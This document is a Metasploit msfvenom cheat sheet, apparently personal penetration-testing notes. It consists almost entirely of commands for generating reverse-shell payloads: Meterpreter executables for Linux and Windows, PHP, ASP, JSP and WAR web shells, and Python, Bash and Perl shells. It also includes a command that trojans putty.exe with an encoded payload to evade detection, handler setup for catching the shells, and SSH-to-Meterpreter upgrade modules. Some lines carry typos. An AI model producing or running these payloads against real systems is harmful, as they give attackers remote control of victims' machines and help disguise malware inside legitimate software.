MSFVENOM
-----
List payloads
 msfvenom -l
 
            == Binaries ==
 Linux
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.139 LPORT=8443 -f elf-so > shell.so
    
 Windows
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
 
 msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.159 -e x86/shikata_ga_nai -i 5 -b "\x00" -f exe -o putty1.exe

 *Linux Based Shellcode* - generic
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

*Windows Based Shellcode* - generic
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
 
           == Web payloads ==
  
PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.159 LPORT=53 R > cmd.jsp

WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

            == Scripting Payloads ==

Python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

BASH
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl

          == HANDLERS ==
 Setup metasploit to receive shells easily.
 
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z

mssf > use exploit/multi/handler 
msf exploit(handler) > setg PAYLOAD java/jsp_shell_reverse_tcp
PAYLOAD => java/jsp_shell_reverse_tcp
set LHOST 10.11.0.159
set LPORT 4343
LPORT => 4343
msetg SHELL cmd.exe
exploit -j -z

-----
SSH to Meterpreter:

         use auxiliary/scanner/ssh/ssh_login
         use post/multi/manage/shell_to_meterpreter

